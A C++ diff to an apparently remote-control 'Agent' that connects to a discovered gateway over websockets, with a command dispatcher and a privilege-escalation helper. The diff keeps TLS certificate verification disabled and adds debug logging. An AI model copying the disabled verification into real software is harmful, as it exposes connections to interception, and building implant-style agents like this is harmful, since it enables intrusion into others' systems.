@@ -10,7 +10,8 @@
 using json = nlohmann::json;
 using std::cout;
 
-Agent::Agent(boost::asio::io_context& ioc) : ioc_(ioc), dispatcher_(std::make_shared<CommandDispatcher>()) {
+Agent::Agent(boost::asio::io_context& ioc) : ioc_(ioc), ctx_(boost::asio::ssl::context::tls_client), dispatcher_(std::make_shared<CommandDispatcher>()) {
+    ctx_.set_verify_mode(boost::asio::ssl::verify_none);
     std::string hostname = getHostName();
     std::string username = PrivilegeEscalation::getCurrentUsername();
     
@@ -63,17 +64,12 @@ void Agent::connectToGateway() {
         std::string host = discoveredHost_;
         std::string port = discoveredPort_.empty() ? "8080" : discoveredPort_;
         
-        boost::asio::ssl::context ctx(boost::asio::ssl::context::tls_client);
-        ctx.set_options(boost::asio::ssl::context::default_workarounds |
-                    boost::asio::ssl::context::no_sslv2 |
-                    boost::asio::ssl::context::no_sslv3);
-        ctx.set_verify_mode(boost::asio::ssl::verify_none);
-        
         cout << "[Network] Attempting WSS connection to: " << host << ":" << port << "\n" << std::flush;
         
         try {
-            client_ = std::make_shared<WSConnection>(ioc_, ctx, host, port, "/");
-
+            std::cout << "[Debug] Creating WSConnection object..." << std::endl;
+            client_ = std::make_shared<WSConnection>(ioc_, ctx_, host, port, "/");
+            std::cout << "[Debug] WSConnection object created successfully." << std::endl;
             client_->onConnected = [this]() {
                 this->onConnected();
             };
@@ -103,8 +99,10 @@ void Agent::connectToGateway() {
             client_->connect();
 
         } catch (const std::exception& e) {
+            std::cerr << "[FATAL] Standard exception: " << e.what() << std::endl;
             onDisconnected();
         } catch (...) {
+            std::cerr << "[FATAL] Standard exception";
             onDisconnected();
         } 
     } catch (const std::exception& e) {
